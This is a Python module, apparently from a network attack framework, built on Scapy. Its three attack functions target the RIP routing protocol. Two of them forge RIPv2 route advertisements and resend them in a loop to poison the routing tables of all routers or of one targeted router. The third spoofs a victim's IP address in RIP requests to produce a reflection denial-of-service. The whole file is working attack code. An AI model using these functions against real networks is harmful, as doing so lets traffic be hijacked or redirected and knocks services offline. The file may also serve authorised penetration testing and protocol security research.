from scapy.layers.inet import IP
from scapy.layers.l2 import Ether, Dot3
from scapy.layers.rip import *
from scapy.packet import Packet
from libs.aux_funcs import send_l3_loop, send_l2_loop, attack_cat, attack_layer, attack_type, type_wrapper


RIP_BROADCAST_IP = '224.0.0.9'
RIP_UDP_PORT = 520

@type_wrapper(name="RIP Route Injection", type=attack_type.RoutePoisoning, category=attack_cat.Attack, layer=attack_layer.L3_RIP, arg_list=[])
def RIP_route_injection(args):
    """Performs a RIP route injection attack. Utilizes imported routing information.
    Requires no additional arguments"""
    pkt = args['pkt']

    # Parse imported routes into RIP packet format
    rip_info = _RIP_parse_routes(args['rip_info'])

    # Check for pre-existing layers
    if pkt != None:
        if pkt.haslayer(IP):    # If theres a pre-existing IP layer, change the parameters
            pkt[IP].ttl = 15
            pkt[IP].dst = RIP_BROADCAST_IP
        else:   # Else create the IP layer
            pkt = pkt/IP(dst=RIP_BROADCAST_IP, ttl = 15)
        # Add the necessary UDP and RIP layers
        pkt = pkt/UDP(sport=RIP_UDP_PORT,dport=RIP_UDP_PORT)/RIP(cmd=2,version=2)/rip_info
    else:   
        pkt = IP(dst=RIP_BROADCAST_IP, ttl=15)/UDP(sport=RIP_UDP_PORT,dport=RIP_UDP_PORT)/RIP(cmd=2,version=2)/rip_info

    args['pkt'] = pkt
    args['interval'] = 60

    # Check which sending function to use
    if pkt.haslayer(Ether) or pkt.haslayer(Dot3):
        send_l2_loop(args)
    else:
        send_l3_loop(args)


@type_wrapper(name="RIP Route Injection (Targeted)", type=attack_type.RoutePoisoning, category=attack_cat.Attack, layer=attack_layer.L3_RIP, arg_list=['target_ip'])
def RIP_targeted_injection(args):
    """Performs a RIP route injection attack, targeted to a specific router. Utilizes imported routing information.
    Requires one additional argument:
    arg         desc                example value
    target_ip   Target IP address   192.168.1.10"""

    pkt = args['pkt']
    target = args['target_ip']

    # Parse imported routes into RIP packet format
    rip_info = _RIP_parse_routes(args['rip_info'])

    # Check for pre-existing layers
    if pkt != None:
        if pkt.haslayer(IP):    # If theres a pre-existing IP layer, change the parameters
            pkt[IP].ttl = 15
            pkt[IP].dst = target
        else:   # Else create the IP layer
            pkt = pkt/IP(dst=target, ttl = 15)
        # Add the necessary UDP and RIP layers
        pkt = pkt/UDP(sport=RIP_UDP_PORT,dport=RIP_UDP_PORT)/RIP(cmd=2,version=2)/rip_info
    else:
        pkt = IP(dst=target, ttl=15)/UDP(sport=RIP_UDP_PORT,dport=RIP_UDP_PORT)/RIP(cmd=2,version=2)/rip_info

    args['pkt'] = pkt
    args['interval'] = 60

    # Check which sending function to use
    if pkt.haslayer(Ether) or pkt.haslayer(Dot3):
        send_l2_loop(args)
    else:
        send_l3_loop(args)

    pass
    

@type_wrapper(name="RIP Request DoS", type=attack_type.DoS, category=attack_cat.Attack, layer=attack_layer.L3_RIP, arg_list=['target_ip','interval'])
def RIP_request_DoS(args):
    """Performs a DoS Reflection attack utilizing RIP requests.
    Requires two additional arguments:
    arg             desc                            example value
    target_ip       Target IP address               192.168.1.100
    interval        Packet send interval (secs)     0
    """

    pkt = args['pkt']

    # Verify present layers
    if pkt != None:
        if pkt.haslayer(IP):    # If IP layer is present, modify some fields
            pkt[IP].ttl = 15
            pkt[IP].src = args['target_ip']
            pkt[IP].dst = RIP_BROADCAST_IP
        elif not pkt.haslayer(IP):  # Else create IP layer
            pkt = pkt/IP(ttl=15, src = args['target_ip'], dst = RIP_BROADCAST_IP)

        # Add RIP related layers
        pkt = pkt/UDP(sport=RIP_UDP_PORT, dport=RIP_UDP_PORT)/\
                RIP(cmd=1,version=2)/\
                RIPEntry(AF=0,metric=16)
    else:
        pkt = IP(src=args['target_ip'], dst=RIP_BROADCAST_IP, ttl=15)/\
                UDP(sport=RIP_UDP_PORT, dport=RIP_UDP_PORT)/\
                RIP(cmd=1,version=2)/\
                RIPEntry(AF=0,metric=16)

    args['pkt'] = pkt

    if pkt.haslayer(Ether) or pkt.haslayer(Dot3):
        send_l2_loop(args)
    else:
        send_l3_loop(args)

    return

############################
#   _RIP_parse_routes()
#   parses RIP routes from dict. format to RIPEntry packet format
############################
def _RIP_parse_routes(args):
    raw_routes = args['rip']['routes']
    pkt = None

    for rr in raw_routes:
        entry = RIPEntry(AF=rr['AF'], RouteTag=rr['routeTag'], addr=rr['addr'], mask=rr['mask'], nextHop=rr['nextHop'], metric=rr['metric'])
        if pkt != None:
            pkt = pkt/entry
        else:
            pkt = entry

    return pkt
